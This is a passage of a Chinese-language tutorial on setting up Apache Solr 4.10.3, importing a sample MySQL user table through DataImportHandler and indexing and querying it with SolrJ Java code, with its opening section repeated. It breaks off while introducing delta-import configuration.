#x8F7D;solr&#xFF0C;&#x5730;&#x5740;&#xFF1A;http://mirrors.hust.edu.cn/apache/lucene/solr/2&#x3001;&#x89E3;&#x538B;&#x5230;&#x67D0;&#x4E2A;&#x76EE;&#x5F55;3&#x3001;cd into D:\\Solr\\solr-4.10.3\\example4&#x3001;Execute the server by &#x201C;java -jar startup.jar&#x201D;Solr&#x4F1A;&#x81EA;&#x52A8;&#x8FD0;&#x884C;&#x5728;&#x81EA;&#x5E26;&#x7684;Jetty&#x4E0A;5&#x3001;&#x8BBF;&#x95EE;http://localhost:8983/solr/#/ PS&#xFF1A;solr-5.0 &#x4EE5;&#x4E0A;&#x9ED8;&#x8BA4;&#x5BF9;schema&#x7684;&#x7BA1;&#x7406;&#x662F;&#x4F7F;&#x7528;managed-schema&#xFF0C;&#x4E0D;&#x80FD;&#x624B;&#x52A8;&#x4FEE;&#x6539;&#xFF0C;&#x9700;&#x8981;&#x4F7F;&#x7528;Schema Restful&#x7684;API&#x64CD;&#x4F5C;&#x3002;&#x5982;&#x679C;&#x8981;&#x60F3;&#x624B;&#x52A8;&#x4FEE;&#x6539;&#x914D;&#x7F6E;&#xFF0C;&#x628A;managed-schema&#x62F7;&#x8D1D;&#x4E00;&#x4EFD;&#x4FEE;&#x6539;&#x4E3A;schema.xml&#xFF0C;&#x5728;solrconfig.xml&#x4E2D;&#x4FEE;&#x6539;&#x5982;&#x4E0B;&#xFF1A; 1234567891011121314151617181920212223242526272829&lt;!-- &lt;schemaFactory class=&quot;ManagedIndexSchemaFactory&quot;&gt; &lt;bool name=&quot;mutable&quot;&gt;true&lt;/bool&gt; &lt;str name=&quot;managedSchemaResourceName&quot;&gt;managed-schema&lt;/str&gt; &lt;/schemaFactory&gt; --&gt; &lt;!-- &lt;processor class=&quot;solr.AddSchemaFieldsUpdateProcessorFactory&quot;&gt; &lt;str name=&quot;defaultFieldType&quot;&gt;strings&lt;/str&gt; &lt;lst name=&quot;typeMapping&quot;&gt; &lt;str name=&quot;valueClass&quot;&gt;java.lang.Boolean&lt;/str&gt; &lt;str name=&quot;fieldType&quot;&gt;booleans&lt;/str&gt; &lt;/lst&gt; &lt;lst name=&quot;typeMapping&quot;&gt; &lt;str name=&quot;valueClass&quot;&gt;java.util.Date&lt;/str&gt; &lt;str name=&quot;fieldType&quot;&gt;tdates&lt;/str&gt; &lt;/lst&gt; &lt;lst name=&quot;typeMapping&quot;&gt; &lt;str name=&quot;valueClass&quot;&gt;java.lang.Long&lt;/str&gt; &lt;str name=&quot;valueClass&quot;&gt;java.lang.Integer&lt;/str&gt; &lt;str name=&quot;fieldType&quot;&gt;tlongs&lt;/str&gt; &lt;/lst&gt; &lt;lst name=&quot;typeMapping&quot;&gt; &lt;str name=&quot;valueClass&quot;&gt;java.lang.Number&lt;/str&gt; &lt;str name=&quot;fieldType&quot;&gt;tdoubles&lt;/str&gt; &lt;/lst&gt; &lt;/processor&gt; --&gt; &lt;schemaFactory class=&quot;ClassicIndexSchemaFactory&quot;/&gt;","keywords":null,"text":"&#x73AF;&#x5883;&#x642D;&#x5EFA;1&#x3001;&#x5230;apache&#x4E0B;&#x8F7D;solr&#xFF0C;&#x5730;&#x5740;&#xFF1A;http://mirrors.hust.edu.cn/apache/lucene/solr/2&#x3001;&#x89E3;&#x538B;&#x5230;&#x67D0;&#x4E2A;&#x76EE;&#x5F55;3&#x3001;cd into D:\\Solr\\solr-4.10.3\\example4&#x3001;Execute the server by &#x201C;java -jar startup.jar&#x201D;Solr&#x4F1A;&#x81EA;&#x52A8;&#x8FD0;&#x884C;&#x5728;&#x81EA;&#x5E26;&#x7684;Jetty&#x4E0A;5&#x3001;&#x8BBF;&#x95EE;http://localhost:8983/solr/#/ PS&#xFF1A;solr-5.0 &#x4EE5;&#x4E0A;&#x9ED8;&#x8BA4;&#x5BF9;schema&#x7684;&#x7BA1;&#x7406;&#x662F;&#x4F7F;&#x7528;managed-schema&#xFF0C;&#x4E0D;&#x80FD;&#x624B;&#x52A8;&#x4FEE;&#x6539;&#xFF0C;&#x9700;&#x8981;&#x4F7F;&#x7528;Schema Restful&#x7684;API&#x64CD;&#x4F5C;&#x3002;&#x5982;&#x679C;&#x8981;&#x60F3;&#x624B;&#x52A8;&#x4FEE;&#x6539;&#x914D;&#x7F6E;&#xFF0C;&#x628A;managed-schema&#x62F7;&#x8D1D;&#x4E00;&#x4EFD;&#x4FEE;&#x6539;&#x4E3A;schema.xml&#xFF0C;&#x5728;solrconfig.xml&#x4E2D;&#x4FEE;&#x6539;&#x5982;&#x4E0B;&#xFF1A; 1234567891011121314151617181920212223242526272829&lt;!-- &lt;schemaFactory class=&quot;ManagedIndexSchemaFactory&quot;&gt; &lt;bool name=&quot;mutable&quot;&gt;true&lt;/bool&gt; &lt;str name=&quot;managedSchemaResourceName&quot;&gt;managed-schema&lt;/str&gt; &lt;/schemaFactory&gt; --&gt; &lt;!-- &lt;processor class=&quot;solr.AddSchemaFieldsUpdateProcessorFactory&quot;&gt; &lt;str name=&quot;defaultFieldType&quot;&gt;strings&lt;/str&gt; &lt;lst name=&quot;typeMapping&quot;&gt; &lt;str name=&quot;valueClass&quot;&gt;java.lang.Boolean&lt;/str&gt; &lt;str name=&quot;fieldType&quot;&gt;booleans&lt;/str&gt; &lt;/lst&gt; &lt;lst name=&quot;typeMapping&quot;&gt; &lt;str name=&quot;valueClass&quot;&gt;java.util.Date&lt;/str&gt; &lt;str name=&quot;fieldType&quot;&gt;tdates&lt;/str&gt; &lt;/lst&gt; &lt;lst name=&quot;typeMapping&quot;&gt; &lt;str name=&quot;valueClass&quot;&gt;java.lang.Long&lt;/str&gt; &lt;str name=&quot;valueClass&quot;&gt;java.lang.Integer&lt;/str&gt; &lt;str name=&quot;fieldType&quot;&gt;tlongs&lt;/str&gt; &lt;/lst&gt; &lt;lst name=&quot;typeMapping&quot;&gt; &lt;str name=&quot;valueClass&quot;&gt;java.lang.Number&lt;/str&gt; &lt;str name=&quot;fieldType&quot;&gt;tdoubles&lt;/str&gt; &lt;/lst&gt; &lt;/processor&gt; --&gt; &lt;schemaFactory class=&quot;ClassicIndexSchemaFactory&quot;/&gt; &#x521B;&#x5EFA;MySQL&#x6570;&#x636E;DataBase Name: mybatisTable Name: userDb.sql 12345678910111213141516171819202122SET FOREIGN_KEY_CHECKS=0;-- ------------------------------ Table structure for `user`-- ----------------------------DROP TABLE IF EXISTS `user`;CREATE TABLE `user` ( `id` int(11) NOT NULL AUTO_INCREMENT, `userName` varchar(50) DEFAULT NULL, `userAge` int(11) DEFAULT NULL, `userAddress` varchar(200) DEFAULT NULL, PRIMARY KEY (`id`)) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8;-- ------------------------------ Records of user-- ----------------------------INSERT INTO `user` VALUES (&apos;1&apos;, &apos;summer&apos;, &apos;30&apos;, &apos;shanghai&apos;);INSERT INTO `user` VALUES (&apos;2&apos;, &apos;test1&apos;, &apos;22&apos;, &apos;suzhou&apos;);INSERT INTO `user` VALUES (&apos;3&apos;, &apos;test1&apos;, &apos;29&apos;, &apos;some place&apos;);INSERT INTO `user` VALUES (&apos;4&apos;, &apos;lu&apos;, &apos;28&apos;, &apos;some place&apos;);INSERT INTO `user` VALUES (&apos;5&apos;, &apos;xiaoxun&apos;, &apos;27&apos;, &apos;nanjing&apos;); &#x4F7F;&#x7528;DataImportHandler&#x5BFC;&#x5165;&#x5E76;&#x7D22;&#x5F15;&#x6570;&#x636E;1&#xFF09; &#x914D;&#x7F6E;D:\\Solr\\solr-4.10.3\\example\\solr\\collection1\\conf\\solrconfig.xml &#x5728;&#x524D;&#x9762;&#x4E0A;&#x52A0;&#x4E0A;&#x4E00;&#x4E2A;dataimport&#x7684;&#x5904;&#x7406;&#x7684;Handler12345&lt;requestHandler name=&quot;/dataimport&quot; class=&quot;org.apache.solr.handler.dataimport.DataImportHandler&quot;&gt;&#x3000;&#x3000; &lt;lst name=&quot;defaults&quot;&gt;&#x3000;&#x3000; &lt;str name=&quot;config&quot;&gt;data-config.xml&lt;/str&gt;&#x3000;&#x3000; &lt;/lst&gt;&#x3000;&#x3000;&lt;/requestHandler&gt; 2&#xFF09; &#x5728;&#x540C;&#x76EE;&#x5F55;&#x4E0B;&#x6DFB;&#x52A0;data-config.xml 12345678910111213&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;dataConfig&gt; &lt;dataSource type=&quot;JdbcDataSource&quot; driver=&quot;com.mysql.jdbc.Driver&quot; url=&quot;jdbc:mysql://127.0.0.1:3306/mybatis&quot; user=&quot;root&quot; password=&quot;luxx&quot; batchSize=&quot;-1&quot; /&gt;&#x3000;&#x3000;&lt;document name=&quot;testDoc&quot;&gt; &lt;entity name=&quot;user&quot; pk=&quot;id&quot; query=&quot;select * from user&quot;&gt;&#x3000;&#x3000;&#x3000; &lt;field column=&quot;id&quot; name=&quot;id&quot;/&gt;&#x3000;&#x3000;&#x3000; &lt;field column=&quot;userName&quot; name=&quot;userName&quot;/&gt; &lt;field column=&quot;userAge&quot; name=&quot;userAge&quot;/&gt; &lt;field column=&quot;userAddress&quot; name=&quot;userAddress&quot;/&gt;&#x3000;&#x3000;&#x3000; &lt;/entity&gt;&#x3000;&#x3000;&lt;/document&gt;&lt;/dataConfig&gt; &#x8BF4;&#x660E;&#xFF1A;dataSource&#x662F;&#x6570;&#x636E;&#x5E93;&#x6570;&#x636E;&#x6E90;&#x3002;Entity&#x5C31;&#x662F;&#x4E00;&#x5F20;&#x8868;&#x5BF9;&#x5E94;&#x7684;&#x5B9E;&#x4F53;&#xFF0C;pk&#x662F;&#x4E3B;&#x952E;&#xFF0C;query&#x662F;&#x67E5;&#x8BE2;&#x8BED;&#x53E5;&#x3002;Field&#x5BF9;&#x5E94;&#x4E00;&#x4E2A;&#x5B57;&#x6BB5;&#xFF0C;column&#x662F;&#x6570;&#x636E;&#x5E93;&#x91CC;&#x7684;column&#x540D;&#xFF0C;&#x540E;&#x9762;&#x7684;name&#x5C5E;&#x6027;&#x5BF9;&#x5E94;&#x7740;Solr&#x7684;Filed&#x7684;&#x540D;&#x5B57;&#x3002; 3&#xFF09; &#x4FEE;&#x6539;&#x540C;&#x76EE;&#x5F55;&#x4E0B;&#x7684;schema.xml&#xFF0C;&#x8FD9;&#x662F;Solr&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x91CC;&#x7684;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x7D22;&#x5F15;&#x7684;&#x6A21;&#x5F0F;&#xFF08;1&#xFF09;&#x4FDD;&#x7559;version &#x8FD9;&#x4E2A;field&#xFF08;2&#xFF09;&#x6DFB;&#x52A0;&#x7D22;&#x5F15;&#x5B57;&#x6BB5;&#xFF1A;&#x8FD9;&#x91CC;&#x6BCF;&#x4E2A;field&#x7684;name&#x8981;&#x548C;data-config.xml&#x91CC;&#x7684;entity&#x7684;field&#x7684;name&#x4E00;&#x6837;&#xFF0C;&#x4E00;&#x4E00;&#x5BF9;&#x5E94;&#x3002; 123456789&lt;field name=&quot;id&quot; type=&quot;int&quot; indexed=&quot;true&quot; stored=&quot;true&quot; required=&quot;true&quot; multiValued=&quot;false&quot; /&gt;&lt;!--&lt;field name=&quot;id&quot; type=&quot;int&quot; indexed=&quot;true&quot; stored=&quot;true&quot; required=&quot;true&quot; multiValued=&quot;false&quot;/&gt; --&gt;&lt;field name=&quot;userName&quot; type=&quot;text_general&quot; indexed=&quot;true&quot; stored=&quot;true&quot; /&gt;&lt;field name=&quot;userAge&quot; type=&quot;int&quot; indexed=&quot;true&quot; stored=&quot;true&quot; /&gt;&lt;field name=&quot;userAddress&quot; type=&quot;text_general&quot; indexed=&quot;true&quot; stored=&quot;true&quot; /&gt; &#xFF08;3&#xFF09;&#x5220;&#x9664;&#x591A;&#x4F59;&#x7684;field&#xFF0C;&#x5220;&#x9664;copyField&#x91CC;&#x7684;&#x8BBE;&#x7F6E;&#xFF0C;&#x8FD9;&#x4E9B;&#x7528;&#x4E0D;&#x4E0A;&#x3002;&#x6CE8;&#x610F;&#xFF1A;text&#x8FD9;&#x4E2A;field&#x4E0D;&#x80FD;&#x5220;&#x9664;&#xFF0C;&#x5426;&#x5219;Solr&#x542F;&#x52A8;&#x5931;&#x8D25;&#x3002;1&lt;field name=&quot;text&quot; type=&quot;text_general&quot; indexed=&quot;true&quot; stored=&quot;false&quot; multiValued=&quot;true&quot;/&gt; &#xFF08;4&#xFF09;&#x8BBE;&#x7F6E;&#x552F;&#x4E00;&#x4E3B;&#x952E;&#xFF1A;id&#xFF0C;&#x6CE8;&#x610F;&#xFF1A;Solr&#x4E2D;&#x7D22;&#x5F15;&#x7684;&#x4E3B;&#x952E;&#x9ED8;&#x8BA4;&#x662F;&#x53EA;&#x652F;&#x6301;type=&#x201D;string&#x201D;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;&#x7684;&#xFF0C;&#x800C;&#x6211;&#x7684;&#x6570;&#x636E;&#x5E93;&#x4E2D;id&#x662F;int&#x578B;&#x7684;&#xFF0C;&#x4F1A;&#x6709;&#x95EE;&#x9898;&#xFF0C;&#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#xFF1A;&#x4FEE;&#x6539;&#x540C;&#x76EE;&#x5F55;&#x4E0B;&#x7684;elevate.xml&#xFF0C;&#x6CE8;&#x91CA;&#x6389;&#x4E0B;&#x9762;2&#x884C;&#xFF0C;&#x8FD9;&#x8C8C;&#x4F3C;&#x662F;Solr&#x7684;Bug&#xFF0C;&#x539F;&#x56E0;&#x4E0D;&#x660E;&#x3002;12&lt;doc id=&quot;MA147LL/A&quot; /&gt;&lt;doc id=&quot;IW-02&quot; exclude=&quot;true&quot; /&gt; 4&#xFF09;&#x62F7;&#x8D1D;mysql-connector-java-5.1.22-bin.jar&#x548C;solr-dataimporthandler-4.10.3.jar&#x5230;D:\\Solr\\solr-4.10.3\\example\\solr-webapp\\webapp\\WEB-INF\\lib&#x3002;&#x4E00;&#x4E2A;&#x662F;mysql&#x7684;java&#x9A71;&#x52A8;&#xFF0C;&#x53E6;&#x4E00;&#x4E2A;&#x5728;D:\\Solr\\solr-4.10.3\\dist&#x76EE;&#x5F55;&#x91CC;&#xFF0C;&#x662F;org.apache.solr.handler.dataimport.DataImportHandler&#x6240;&#x5728;&#x7684;jar&#x3002; &#x91CD;&#x542F;Solr&#x3002;&#x5982;&#x679C;&#x914D;&#x7F6E;&#x6B63;&#x786E;&#x5C31;&#x53EF;&#x4EE5;&#x542F;&#x52A8;&#x6210;&#x529F;&#x3002; solrconfig.xml&#x662F;solr&#x7684;&#x57FA;&#x7840;&#x6587;&#x4EF6;&#xFF0C;&#x91CC;&#x9762;&#x914D;&#x7F6E;&#x4E86;&#x5404;&#x79CD;web&#x8BF7;&#x6C42;&#x5904;&#x7406;&#x5668;&#x3001;&#x8BF7;&#x6C42;&#x54CD;&#x5E94;&#x5904;&#x7406;&#x5668;&#x3001;&#x65E5;&#x5FD7;&#x3001;&#x7F13;&#x5B58;&#x7B49;&#x3002;schema.xml&#x914D;&#x7F6E;&#x6620;&#x5C04;&#x4E86;&#x5404;&#x79CD;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x7684;&#x7D22;&#x5F15;&#x65B9;&#x6848;&#x3002;&#x5206;&#x8BCD;&#x5668;&#x7684;&#x914D;&#x7F6E;&#x3001;&#x7D22;&#x5F15;&#x6587;&#x6863;&#x4E2D;&#x5305;&#x542B;&#x7684;&#x5B57;&#x6BB5;&#x4E5F;&#x5728;&#x6B64;&#x914D;&#x7F6E;&#x3002; &#x7D22;&#x5F15;&#x6D4B;&#x8BD5;&#x8FDB;&#x5165;Solr&#x4E3B;&#x9875;&#xFF0C;&#x5728;Core Selector&#x4E2D;&#x9009;&#x62E9;collection1&#xFF1A;http://localhost:8983/solr/#/collection1 &#x70B9;&#x51FB;Dataimport&#xFF0C;Command&#x9009;&#x62E9;full-import&#xFF08;&#x9ED8;&#x8BA4;&#xFF09;&#xFF0C;&#x70B9;&#x51FB;&#x201C;Execute&#x201D;&#xFF0C;Refresh Status&#x5C31;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x7ED3;&#x679C;&#xFF1A;Indexing completed. Added/Updated: 7 documents.Deleted 0 documents.Requests: 1, Fetched: 7, Skipped: 0, Processed: 7Started: 8 minutes ago Query&#x6D4B;&#x8BD5;&#xFF1A;&#x5728;q&#x4E2D;&#x8F93;&#x5165;userName:test1&#x8FDB;&#x884C;&#x68C0;&#x7D22;&#x5C31;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x7ED3;&#x679C;&#x3002;&#x8FD9;&#x91CC;&#x4F7F;&#x7528;full-import&#x7D22;&#x5F15;&#x4E86;&#x914D;&#x7F6E;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x5168;&#x90E8;&#x6570;&#x636E;&#xFF0C;&#x4F7F;&#x7528;Solr&#x53EF;&#x4EE5;&#x67E5;&#x8BE2;&#x5BF9;&#x5E94;&#x7684;&#x6570;&#x636E;&#x3002; &#x4F7F;&#x7528;Solrj&#x7D22;&#x5F15;&#x5E76;&#x68C0;&#x7D22;&#x6570;&#x636E;&#x4E0A;&#x9762;&#x662F;&#x4F7F;&#x7528;Solr Admin&#x9875;&#x9762;&#x4E0A;&#x7684;&#x529F;&#x80FD;&#x6D4B;&#x8BD5;&#x7D22;&#x5F15;&#x548C;&#x68C0;&#x7D22;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x4EE3;&#x7801;&#x6765;&#x64CD;&#x4F5C;Solr&#xFF0C;&#x4E0B;&#x9762;&#x7684;&#x4EE3;&#x7801;&#x6D4B;&#x8BD5;&#x4E86;&#x5728;Solr&#x7D22;&#x5F15;&#x4E2D;&#x6DFB;&#x52A0;&#x4E86;&#x4E00;&#x4E2A;User&#x7C7B;&#x5B9E;&#x4F53;&#xFF0C;&#x5E76;&#x901A;&#x8FC7;&#x67E5;&#x627E;&#x6240;&#x6709;&#x7684;index&#x6765;&#x8FD4;&#x56DE;&#x7ED3;&#x679C;&#x3002; User&#x5B9E;&#x4F53;&#x7C7B;&#xFF1A; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556package com.mybatis.test.model;import org.apache.solr.client.solrj.beans.Field;public class User { @Field private int id; @Field private String userName; @Field private int userAge; @Field private String userAddress; public int getId() { return id; } public void setId(int id) { this.id = id; } public String getUserName() { return userName; } public void setUserName(String userName) { this.userName = userName; } public int getUserAge() { return userAge; } public void setUserAge(int userAge) { this.userAge = userAge; } public String getUserAddress() { return userAddress; } public void setUserAddress(String userAddress) { this.userAddress = userAddress; } @Override public String toString() { return this.userName + &quot; &quot; + this.userAge + &quot; &quot; + this.userAddress; }} &#x4F7F;&#x7528;@Field&#x6CE8;&#x89E3;&#x7684;&#x5C5E;&#x6027;&#x8981;&#x548C;Solr&#x914D;&#x7F6E;&#x7684;Field&#x5BF9;&#x5E94;&#x3002; &#x6D4B;&#x8BD5;&#x4EE3;&#x7801;&#xFF1A; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889package com.solr.test;import java.io.IOException;import org.apache.solr.client.solrj.SolrQuery;import org.apache.solr.client.solrj.SolrServer;import org.apache.solr.client.solrj.SolrServerException;import org.apache.solr.client.solrj.impl.HttpSolrServer;import org.apache.solr.client.solrj.response.QueryResponse;import org.apache.solr.client.solrj.response.UpdateResponse;import org.apache.solr.common.SolrDocumentList;import com.mybatis.test.model.User;public class SolrTest { private static SolrServer server; private static final String DEFAULT_URL = &quot;http://localhost:8983/solr/collection1&quot;; public static void init() { server = new HttpSolrServer(DEFAULT_URL); } public static void indexUser(User user){ try { //&#x6DFB;&#x52A0;user bean&#x5230;&#x7D22;&#x5F15;&#x5E93; try { UpdateResponse response = server.addBean(user); server.commit(); System.out.println(response.getStatus()); } catch (IOException e) { e.printStackTrace(); } } catch (SolrServerException e) { e.printStackTrace(); } } //&#x6D4B;&#x8BD5;&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;&#x65B0;&#x7684;bean&#x5B9E;&#x4F8B;&#x5230;&#x7D22;&#x5F15; public static void testIndexUser(){ User user = new User(); user.setId(8); user.setUserAddress(&quot;place&quot;); user.setUserName(&quot;cdebcdccga&quot;); user.setUserAge(83); indexUser(user); } public static void testQueryAll() { SolrQuery params = new SolrQuery(); // &#x67E5;&#x8BE2;&#x5173;&#x952E;&#x8BCD;&#xFF0C;*:*&#x4EE3;&#x8868;&#x6240;&#x6709;&#x5C5E;&#x6027;&#x3001;&#x6240;&#x6709;&#x503C;&#xFF0C;&#x5373;&#x6240;&#x6709;index params.set(&quot;q&quot;, &quot;*:*&quot;); // &#x5206;&#x9875;&#xFF0C;start=0&#x5C31;&#x662F;&#x4ECE;0&#x5F00;&#x59CB;&#xFF0C;rows=5&#x5F53;&#x524D;&#x8FD4;&#x56DE;5&#x6761;&#x8BB0;&#x5F55;&#xFF0C;&#x7B2C;&#x4E8C;&#x9875;&#x5C31;&#x662F;&#x53D8;&#x5316;start&#x8FD9;&#x4E2A;&#x503C;&#x4E3A;5&#x5C31;&#x53EF;&#x4EE5;&#x4E86;&#x3002; params.set(&quot;start&quot;, 0); params.set(&quot;rows&quot;, Integer.MAX_VALUE); // &#x6392;&#x5E8F;&#xFF0C;&#x5982;&#x679C;&#x6309;&#x7167;id&#x6392;&#x5E8F;&#xFF0C;&#x90A3;&#x4E48;&#x5C06;score desc &#x6539;&#x6210; id desc(or asc) // params.set(&quot;sort&quot;, &quot;score desc&quot;); params.set(&quot;sort&quot;, &quot;id asc&quot;); // &#x8FD4;&#x56DE;&#x4FE1;&#x606F;*&#x4E3A;&#x5168;&#x90E8;&#xFF0C;&#x8FD9;&#x91CC;&#x662F;&#x5168;&#x90E8;&#x52A0;&#x4E0A;score&#xFF0C;&#x5982;&#x679C;&#x4E0D;&#x52A0;&#x4E0B;&#x9762;&#x5C31;&#x4E0D;&#x80FD;&#x4F7F;&#x7528;score params.set(&quot;fl&quot;, &quot;*,score&quot;); QueryResponse response = null; try { response = server.query(params); } catch (SolrServerException e) { e.printStackTrace(); } if(response!=null){ System.out.println(&quot;Search Results: &quot;); SolrDocumentList list = response.getResults(); for (int i = 0; i &lt; list.size(); i++) { System.out.println(list.get(i)); } } } public static void main(String[] args) { init(); //testIndexUser(); testQueryAll(); }} &#x5982;&#x679C;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x6DFB;&#x52A0;&#x4E00;&#x6761;&#x6570;&#x636E;&#xFF0C;&#x4F46;&#x662F;Solr&#x7D22;&#x5F15;&#x4E2D;&#x6CA1;&#x6709;index&#x8FD9;&#x6761;&#x6570;&#x636E;&#xFF0C;&#x5C31;&#x67E5;&#x4E0D;&#x5230;&#xFF0C;&#x6240;&#x4EE5;&#x4E00;&#x822C;&#x5728;&#x4F7F;&#x7528;Solr&#x68C0;&#x7D22;&#x6570;&#x636E;&#x5E93;&#x91CC;&#x7684;&#x5185;&#x5BB9;&#x65F6;&#xFF0C;&#x90FD;&#x662F;&#x5148;&#x63D2;&#x5165;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x518D;&#x5728;Solr&#x4E2D;index&#x8FD9;&#x6761;&#x6570;&#x636E;&#xFF0C;&#x4F7F;&#x7528;Solr&#x7684;&#x6A21;&#x7CCA;&#x67E5;&#x8BE2;&#x6216;&#x662F;&#x5206;&#x8BCD;&#x529F;&#x80FD;&#x6765;&#x68C0;&#x7D22;&#x6570;&#x636E;&#x5E93;&#x91CC;&#x7684;&#x5185;&#x5BB9;&#x3002; DIH&#x589E;&#x91CF;&#x4ECE;MYSQL&#x6570;&#x636E;&#x5E93;&#x5BFC;&#x5165;&#x6570;&#x636E;&#x5DF2;&#x7ECF;&#x5B66;&#x4F1A;&#x4E86;&#x5982;&#x4F55;&#x5168;&#x91CF;&#x5BFC;&#x5165;MySQL&#x7684;&#x6570;&#x636E;&#xFF0C;&#x5168;&#x91CF;&#x5BFC;&#x5165;&#x5728;&#x6570;&#x636E;&#x91CF;&#x5927;&#x7684;&#x65F6;&#x5019;&#x4EE3;&#x4EF7;&#x975E;&#x5E38;&#x5927;&#xFF0C;&#x4E00;&#x822C;&#x6765;&#x8BF4;&#x90FD;&#x4F1A;&#x9002;&#x7528;&#x589E;&#x91CF;&#x7684;&#x65B9;&#x5F0F;&#x6765;&#x5BFC;&#x5165;&#x6570;&#x636E;&#xFF0C;&#x4E0B;&#x9762;&#x4ECB;&#x7ECD;&#x5982;&#x4F55;&#x589E;&#x91CF;&#x5BFC;&#x5165;MYSQL&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x4EE5;&#x53CA;&#x5982;&#x4F55;&#x8BBE;&#x7F6E;&#x5B9A;&#x65F6;&#x6765;&#x505A;&#x3002; 1&#xFF09;&#x6570;&#x636E;&#x5E93;&#x8868;&#x7684;&#x66F4;&#x6539; &#x524D;&#x9762;&#x5DF2;&#x7ECF;&#x521B;&#x5EFA;&#x597D;&#x4E86;&#x4E00;&#x4E2A;User&#x7684;&#x8868;&#xFF0C;&#x8FD9;&#x91CC;&#x4E3A;&#x4E86;&#x80FD;&#x591F;&#x8FDB;&#x884C;&#x589E;&#x91CF;&#x5BFC;&#x5165;&#xFF0C;&#x9700;&#x8981;&#x65B0;&#x589E;&#x4E00;&#x4E2A;&#x5B57;&#x6BB5;updateTime&#xFF0C;&#x7C7B;&#x578B;&#x4E3A;timestamp&#xFF0C;&#x9ED8;&#x8BA4;&#x503C;&#x4E3A;CURRENT_TIMESTAMP&#x3002; &#x6709;&#x4E86;&#x8FD9;&#x6837;&#x4E00;&#x4E2A;&#x5B57;&#x6BB5;&#xFF0C;Solr&#x624D;&#x80FD;&#x5224;&#x65AD;&#x589E;&#x91CF;&#x5BFC;&#x5165;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x54EA;&#x4E9B;&#x6570;&#x636E;&#x662F;&#x65B0;&#x7684;&#x3002; &#x56E0;&#x4E3A;Solr&#x672C;&#x8EAB;&#x6709;&#x4E00;&#x4E2A;&#x9ED8;&#x8BA4;&#x503C;last_index_time&#xFF0C;&#x8BB0;&#x5F55;&#x6700;&#x540E;&#x4E00;&#x6B21;&#x505A;full import&#x6216;&#x8005;&#x662F;delta import(&#x589E;&#x91CF;&#x5BFC;&#x5165;&#xFF09;&#x7684;&#x65F6;&#x95F4;&#xFF0C;&#x8FD9;&#x4E2A;&#x503C;&#x5B58;&#x50A8;&#x5728;&#x6587;&#x4EF6;conf&#x76EE;&#x5F55;&#x7684;dataimport.properties&#x6587;&#x4EF6;&#x4E2D;&#x3002; 2&#xFF09;data-config.xml&#x4E2D;&#x5FC5;&#x8981;&#x5C5E;&#x6027;&#x7684;&#x8BBE;&#x7F6E; transformer &#x683C;&#x5F0F;&#x8F6C;&#x5316;&#xFF1A;HTMLStripTransformer &#x7D22;&#x5F15;&#x4E2D;&#x5FFD;&#x7565;HTML&#x6807;&#x7B7E;query&#xFF1A;&#x67E5;&#x8BE2;&#x6570;&#x636E;&#x5E93;&#x8868;&#x7B26;&#x5408;&#x8BB0;&#x5F55;&#x6570;&#x636E;deltaQuery&#xFF1A;&#x589E;&#x91CF;&#x7D22;&#x5F15;&#x67E5;&#x8BE2;&#x4E3B;&#x952E;ID &#x6CE8;&#x610F;&#x8FD9;&#x4E2A;&#x53EA;&#x80FD;&#x8FD4;&#x56DE;ID&#x5B57;&#x6BB5;deltaImportQuery&#xFF1A;&#x589E;&#x91CF;&#x7D22;&#x5F15;&#x67E5;&#x8BE2;&#x5BFC;&#x5165;&#x7684;&#x6570;&#x636E;deletedPkQuery&#xFF1A;&#x589E;&#x91CF;&#x7D22;&#x5F15;&#x5220;&#x9664;&#x4E3B;&#x952E;ID&#x67E5;&#x8BE2; &#x6CE8;&#x610F;&#x8FD9;&#x4E2A;&#x53EA;&#x80FD;&#x8FD4;&#x56DE;ID&#x5B57;&#x6BB5; &#x6709;&#x5173;&#x201C;query&#x201D;&#xFF0C;&#x201C;deltaImportQuery&#x201D;&#xFF0C; &#x201C;deltaQuery&#x201D;&#x7684;&#x89E3;&#x91CA;&#xFF0C;&#x5F15;&#x7528;&#x5B98;&#x7F51;&#x8BF4;&#x660E;&#xFF0C;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF1A;The query gives the data needed to populate fields of the Solr document in full-importThe deltaImportQuery gives the data needed to populate fields when running a delta-importThe deltaQuery gives the primary keys of the current entity which have changes since the last index time &#x5982;&#x679C;&#x9700;&#x8981;&#x5173;&#x8054;&#x5B50;&#x8868;&#x67E5;&#x8BE2;&#xFF0C;&#x53EF;&#x80FD;&#x9700;&#x8981;&#x7528;&#x5230;parentDeltaQueryThe parentDeltaQuery uses the changed rows of the current table (fetched with deltaQuery) to give the changed rows in theparent table. This is necessary because whenever a row in the child table changes, we need to re-generate the document which has that field. &#x66F4;&#x591A;&#x8BF4;&#x660E;&#x770B;DeltaImportHandler&#x7684;&#x8BF4;&#x660E;&#x6587;&#x6863;&#x3002; &#x9488;&#x5BF9;User&#x8868;&#xFF0C;data-config.xml&#x6587;&#x4EF6;&#x7684;&#x914D;&#x7F6E;&#x5185;&#x5BB9;&#x5982;&#x4E0B;&#xFF1A; 12345678910111213141516&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;dataConfig&gt; &lt;dataSource type=&quot;JdbcDataSource&quot; driver=&quot;com.mysql.jdbc.Driver&quot; url=&quot;jdbc:mysql://127.0.0.1:3306/mybatis&quot; user=&quot;root&quot; 